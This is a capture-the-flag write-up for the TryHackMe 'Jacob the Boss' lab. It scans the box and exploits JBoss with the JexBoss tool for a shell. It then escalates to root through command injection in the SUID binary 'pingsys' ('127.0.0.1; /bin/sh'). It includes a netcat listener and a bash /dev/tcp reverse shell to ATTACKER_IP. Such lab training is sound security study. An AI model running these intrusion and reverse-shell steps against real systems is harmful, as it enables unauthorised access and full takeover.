# [Jacob the Boss](https://tryhackme.com/room/jacobtheboss)

## Find a way in and learn a little more.

# Go on, it's your machine!

Well, the flaw that makes up this box is the reproduction found in the production environment of a customer a while ago, the verification in season consisted of two steps, the last one within the environment, we hit it head-on and more than 15 machines were vulnerable that together with the development team we were able to correct and adapt.

\*First of all, add the **jacobtheboss.box** address to your hosts file.

Anyway, learn a little more, have fun!

### user.txt

1. Add the target to your hosts file to access the machine using the domain name:

```bash
echo "<TARGET_IP> jacobtheboss.box" >> /etc/hosts
```

2. Run an Nmap scan to discover open ports and services:

```bash
nmap jacobtheboss.box
```

**Results:**

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
1090/tcp open  ff-fms
1098/tcp open  rmiactivation
1099/tcp open  rmiregistry
3306/tcp open  mysql
4444/tcp open  krb524
4445/tcp open  upnotifyp
4446/tcp open  n1-fwp
8009/tcp open  ajp13
8080/tcp open  http-proxy
8083/tcp open  us-srv
```

3. Navigate to `http://jacobtheboss.box:8080` - JBoss administration interface

4. Clone the [JexBoss](https://github.com/joaomatosf/jexboss) exploitation tool:

```bash
git clone https://github.com/joaomatosf/jexboss.git

```

5. Run JexBoss against the target. The tool will automatically detect vulnerable endpoints and attempt exploitation. Once successful, you'll get a shell prompt:

```bash
python jexboss/jexboss.py -host http://jacobtheboss.box:8080
whoami
# jackob
```

6. Retrieve the user flag:

```bash
cat /home/jacob/user.txt
```

[SCREEN01]

---

### root.txt

1. Search for SUID binaries that could be exploited for privilege escalation:

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Results:**

```
/usr/bin/pingsys
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```

`/usr/bin/pingsys` is a non-standard SUID binary.

2. Set up a reverse shell listener on your attacker machine:

```bash
nc -lvnp 4444
```

3. Set up a reverse shell payload

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

4. Exploit the command injection vulnerability from [stackExchange](https://security.stackexchange.com/questions/196577/privilege-escalation-c-functions-setuid0-with-system-not-working-in-linux):

```bash
/usr/bin/pingsys '127.0.0.1; /bin/sh'
```

5. Retrieve the root flag:

```bash
whoami
ls /root
cat /root/root.txt
```

[SCREEN02]
